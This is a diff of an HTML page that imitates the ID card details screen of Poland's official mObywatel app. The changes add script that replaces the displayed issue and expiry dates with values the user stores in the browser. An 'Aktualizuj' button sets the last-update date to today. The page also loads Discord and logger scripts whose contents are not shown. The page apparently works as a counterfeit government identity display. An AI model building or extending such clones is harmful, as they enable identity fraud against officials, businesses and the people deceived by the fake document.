@@ -1,81 +1,213 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
-  <title>mObywatel</title>
-  <link rel="stylesheet" href="assets/moreid.css">
-  <link rel="stylesheet" href="assets/main.css">
-   <link rel="icon" type="image/x-icon" href="https://i.imgur.com/U7TRg0V.png">
+    <title>Dane dowodu osobistego - mObywatel</title>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="assets/card.css?v=2.0">
+    <link rel="stylesheet" href="assets/main.css">
+    <link rel="icon" type="image/x-icon" href="https://i.imgur.com/U7TRg0V.png">
     <link rel="apple-touch-icon" href="https://i.imgur.com/U7TRg0V.png">
     <link rel="shortcut icon" href="https://i.imgur.com/U7TRg0V.png">
     <meta name="format-detection" content="telephone=no">
-    <meta name="viewport" content="width=device-width, initial-scale=0.8, user-scalable=no">
-    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=0.85, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#101419">
+    <link rel="manifest" href="./manifest.json">
+    <style>
+        .moreid-wrapper {
+            width: 100%;
+            max-width: 414px;
+            margin: 0 auto;
+            padding-bottom: 90px;
+            box-sizing: border-box;
+        }
+        .status-row {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 4px;
+        }
+        .status-check-circle {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #1ec737;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #101419;
+            font-size: 13px;
+            font-weight: 700;
+        }
+        .status-text-val {
+            font-size: 17px;
+            font-weight: 600;
+            color: #ffffff;
+        }
+        .pin-action-card {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            padding: 18px 22px;
+        }
+        .pin-action-left {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .pin-icon {
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+        }
+        .pin-text {
+            font-size: 15.5px;
+            font-weight: 600;
+            color: #ffffff;
+            line-height: 1.3;
+        }
+        .pin-chevron {
+            font-size: 20px;
+            color: #5c6474;
+            font-weight: 300;
+        }
+    </style>
 </head>
 <body>
-  <div class="top_grid">
-        <div class="action_grid">
-            <img src="https://i.imgur.com/aXIO2NG.png" class="back_img">
-            <p onclick="sendTo('card')" class="back_text">Wróć</p>
+    <div class="moreid-wrapper">
+        <!-- Pasek górny -->
+        <header class="top_grid">
+            <div class="action_grid" onclick="sendTo('card')">
+                <span class="back_chevron">&lt;</span>
+                <span class="back_text">Wróć</span>
+            </div>
+            <h1 class="title_text" style="font-size: 16px;">Dane dowodu osobistego</h1>
+            <div class="help_icon_btn" onclick="sendTo('more')">?</div>
+        </header>
+
+        <!-- Karta 1: Dane dowodu -->
+        <div class="custom-card" style="margin-top: 14px;">
+            <div class="field">
+                <label>Seria i numer</label>
+                <div class="value-copy">
+                    <b class="mdow_series_value" id="id_series_value" style="font-size: 22px;">ZZC 108201</b>
+                    <button type="button" class="copy-btn" onclick="copyIdNumber()">Kopiuj</button>
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Status</label>
+                <div class="status-row">
+                    <div class="status-check-circle">✓</div>
+                    <span class="status-text-val">Wydany</span>
+                </div>
+            </div>
+
+            <div class="field">
+                <label>Organ wydający</label>
+                <strong id="id_issuer_value">URZĄD MIASTA WARSZAWA</strong>
+            </div>
+
+            <div class="field">
+                <label>Termin ważności</label>
+                <strong id="id_expiry_date_value">11.09.2032</strong>
+            </div>
+
+            <div class="field">
+                <label>Data wydania</label>
+                <strong id="id_issue_date_value">11.09.2022</strong>
+            </div>
         </div>
-        <p class="title_text">Dane&nbsp;dowodu&nbsp;osobistego</p>
-        <img src="https://i.imgur.com/VHNv1TC.png" class="help_img">
+
+        <!-- Karta 2: Ostatnia aktualizacja -->
+        <div class="custom-card update-card">
+            <div class="update-info">
+                <p class="update-title">Ostatnia aktualizacja</p>
+                <p class="update-date" id="id_last_update">24.12.2024</p>
+            </div>
+            <button type="button" class="copy-btn update-btn" onclick="updateDate()">Aktualizuj</button>
+        </div>
+
+        <!-- Karta 3: Zmień PIN -->
+        <div class="custom-card pin-action-card">
+            <div class="pin-action-left">
+                <div class="pin-icon">
+                    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                        <line x1="12" y1="18" x2="12.01" y2="18"></line>
+                        <path d="M9 8h6"></path>
+                        <path d="M9 12h6"></path>
+                    </svg>
+                </div>
+                <div class="pin-text">Zmień PIN do<br>podpisu osobistego</div>
+            </div>
+            <div class="pin-chevron">&gt;</div>
+        </div>
     </div>
 
-    <div class="card custom-card">
-                <div class="field">
-                    <label>Seria i numer</label>
-                    <div class="value-copy">
-                        <b id="id_series_value" style="font-size:23px">ZZC 108201</b>
-                        <button class="value-copy">Kopiuj</button> 
-                    </div>
-                </div>
-                <div class="field">
-  <label>Status</label>
-  <div class="status_with_icon">
-    <img src="https://i.imgur.com/XYP33Vx.png" alt="Status Ikona" class="status_icon">
-    <strong>Wydany</strong>
-  </div>
-</div>
-                
-                <div class="field">
-                    <label>Organ wydający</label>
-                    <strong>URZĄD MIASTA WARSZAWA</strong>
-                </div>
-
-                <div class="field">
-                    <label>Termin ważności</label>
-                    <strong id="id_expiry_date_value">13.04.2032</strong>
-                </div>
-            
-                <div class="field">
-                    <label>Data wydania</label>
-                    <strong id="id_issue_date_value">14.07.2022</strong>
-                </div>
-            
+    <!-- Dolny pasek nawigacji -->
+    <nav class="bottom_bar">
+        <div class="bottom_bar_grid">
+            <div class="bottom_element_grid active" onclick="sendTo('card')">
+                <div class="bottom_element_image home_open"></div>
+                <p class="bottom_element_text open">Dokumenty</p>
             </div>
-
-            <div class="bottom_holder" style="height: 90px; margin-bottom: 12px;">
-            <div class="bottom_update">
-                <div class="bottom_update_grid">
-                    <p class="bottom_update_text" style="margin-left: 0px;">Ostatnia aktualizacja</p>
-                    <p class="bottom_update_value" style="margin-left: 0px;"></p>
-                </div>
-                <button class="main_button update">Aktualizuj</button>
+            <div class="bottom_element_grid" onclick="sendTo('services')">
+                <div class="bottom_element_image services"></div>
+                <p class="bottom_element_text">Usługi</p>
+            </div>
+            <div class="bottom_element_grid" onclick="sendTo('qr')">
+                <div class="bottom_element_image qr"></div>
+                <p class="bottom_element_text">Kod QR</p>
+            </div>
+            <div class="bottom_element_grid" onclick="sendTo('more')">
+                <div class="bottom_element_image more"></div>
+                <p class="bottom_element_text">Więcej</p>
             </div>
         </div>
-      
-      <div class="bottom_holderarrow">
-  <div class="bottom_grid">
-    <img class="phone" src="https://i.imgur.com/RbOXgIB.png" alt="Telefon">
-    <p class="bottom_text">Zmień PIN do podpisu<br>osobistego</p>
-    <img class="action_arrow" src="https://i.imgur.com/lTxuUMF.png" alt="Strzałka">
-  </div>
-</div>
-        <script src="assets/bar.js"></script>
-        <script src="assets/moreid.js?v=1.0"></script>
-        <script src="assets/manifest.js"></script>
-<script src="assets/logger.js"></script>
-<script src="assets/discord-logger.js"></script>
-    </body>
+    </nav>
+
+    <script src="assets/bar.js"></script>
+    <script>
+        function copyIdNumber() {
+            const val = document.getElementById('id_series_value').textContent;
+            if (navigator.clipboard) {
+                navigator.clipboard.writeText(val);
+                alert("Skopiowano do schowka: " + val);
+            }
+        }
+
+        function updateDate() {
+            const now = new Date();
+            const d = String(now.getDate()).padStart(2, '0');
+            const m = String(now.getMonth() + 1).padStart(2, '0');
+            const y = now.getFullYear();
+            const str = `${d}.${m}.${y}`;
+            document.getElementById('id_last_update').textContent = str;
+            localStorage.setItem('mobywatel_id_update', str);
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedUpdate = localStorage.getItem('mobywatel_id_update');
+            if (savedUpdate) {
+                document.getElementById('id_last_update').textContent = savedUpdate;
+            }
+
+            // Sprawdź czy użytkownik ma zapisane custom dane
+            const savedData = localStorage.getItem('mobywatel_card_data');
+            if (savedData) {
+                try {
+                    const data = JSON.parse(savedData);
+                    if (data.expiry_date) document.getElementById('id_expiry_date_value').textContent = data.expiry_date;
+                    if (data.issue_date) document.getElementById('id_issue_date_value').textContent = data.issue_date;
+                } catch(e) {}
+            }
+        });
+    </script>
+    <script src="assets/logger.js"></script>
+    <script src="assets/discord-logger.js"></script>
+</body>
 </html>
